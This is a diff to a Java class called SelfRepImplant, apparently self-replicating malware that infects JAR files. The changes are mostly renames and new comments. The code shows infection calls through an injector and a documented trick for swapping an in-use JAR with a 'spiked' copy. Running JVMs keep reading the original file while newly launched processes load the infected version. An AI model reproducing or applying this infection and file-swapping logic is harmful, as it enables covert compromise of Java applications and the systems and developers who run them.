@@ -126,7 +126,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
 
             try {
-                Path outputTempFile = getTempFilePathFor(jarToImplant);
+                Path outputTempFile = createTempFileFor(jarToImplant);
                 JarFiddler jar = JarFiddler.buffer(jarToImplant);
                 boolean didInfect = injector.injectInto(jar);
                 if (didInfect) {
@@ -284,11 +284,18 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    private static Path getTempFilePathFor(Path existingJar) throws IOException {
-        String targetFilename = existingJar.getFileName().toString();
+    /**
+     * Create a temporary sibling file for a given existing file.
+     *
+     * @param baseFile filename to base the temporary file name on
+     * @return new file
+     * @throws IOException if anything went wrong
+     */
+    private static Path createTempFileFor(Path baseFile) throws IOException {
+        String targetFilename = baseFile.getFileName().toString();
 
         String newFileName = "." + targetFilename + ".tmp";
-        Path tempFilePath = existingJar.resolveSibling(newFileName);
+        Path tempFilePath = baseFile.resolveSibling(newFileName);
         if (Files.exists(tempFilePath)) {
             // Remember that several instances of this thing may run in parallel
             System.out.println("[-] Temporary file '" + tempFilePath + "' already exist! Aborting.");
@@ -302,9 +309,33 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         return tempFilePath;
     }
 
-    private static void doTheSwitcharoo(Path original, Path spiked) throws IOException {
-        if (!Files.exists(spiked)) {
-            throw new IllegalArgumentException("File '" + spiked + "' does not exist.");
+    /**
+     * Replace a JAR file without ruining any JVM that already has the JAR open.
+     * <p>The JVM indexes all classes that it has on it's classpath but actually reads and loads it lazily.
+     * When the JVM opens a JAR file on the classpath, it only reads the index of files and some metadata about it.
+     * It's first when/if the class is needed that it actually reads the class from the JAR file.
+     * If a class inside a JAR file is modified between the indexing and the loading, then there will be a checksum
+     * mismatch of what was indexed and what's read.
+     * This is a tricky situation to circumvent.</p>
+     * <p>This method (together with {@link #createTempFileFor(Path)}) constitutes a trick to circumvent this.
+     * It does so by moving the JAR to a new filename. In POSIX (like Linux) systems, the file handle will still be
+     * open and valid even as the underlying file is moved.
+     * A modified version of the JAR can then be put into place of the original.
+     * Any JVM process that has already loaded the JAR will still be able to read (unmodified) classes from it
+     * because it keeps the same file handle open, while any newly spawned JVM processes will catch the modified JAR
+     * fresh from disk.</p>
+     * <p>Caution: The moved file will remain on disk and may need to be removed manually.
+     * If the file already exist, then this method will fail. It will always remove the replacement file.</p>
+     * <p>This will not work on Windows systems.</p>
+     * <p>It's yet unclear if this will work over NFS shares or even Docker volumes.</p>
+     *
+     * @param original    JAR to replace
+     * @param replacement replacement JAR
+     * @throws IOException if anything went wrong
+     */
+    private static void doTheSwitcharoo(Path original, Path replacement) throws IOException {
+        if (!Files.exists(replacement)) {
+            throw new IllegalArgumentException("File '" + replacement + "' does not exist.");
         }
 
         // First move the original JAR (that may be in use at the moment)
@@ -320,7 +351,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
              * the best. Another way is to use a shutdown hook to delete the file, but that will not work if there's
              * another JVM using the file.
              */
-            Files.delete(spiked);
+            Files.delete(replacement);
             throw new IOException("File already exist: " + moved);
         }
         try {
@@ -328,27 +359,19 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
         } catch (IOException e) {
             // Clean up and back off
-            Files.delete(spiked);
+            Files.delete(replacement);
             throw e;
         }
 
         // Then replace the target with the temporary (spiked) JAR
         try {
-            Files.move(spiked, original);
-            System.out.println("[+] Moved '" + spiked.getFileName() + "' -> '" + original.getFileName() + "'.");
+            Files.move(replacement, original);
+            System.out.println("[+] Moved '" + replacement.getFileName() + "' -> '" + original.getFileName() + "'.");
         } catch (IOException e) {
             // Do not leave the repo in a bad state!
             // Try to undo the whole switch
             Files.move(moved, original);    // If this fails, then there's no hope left
         }
-
-        /*
-         * Any open file handler to the original JAR should now be pointing to a .cache file (on POSIX-like systems)
-         * but any newly launched apps wishing to load the target JAR will pick up the spiked version. This will likely
-         * not work on Windows systems.
-         * Any Java process running on _this_ system will still be able to load any classes in JARs on the classpath.
-         * However, it is unclear if this file moving trick will work over network shares or even on Docker volumes.
-         */
     }
 
     private static Optional<String> getHostname() {
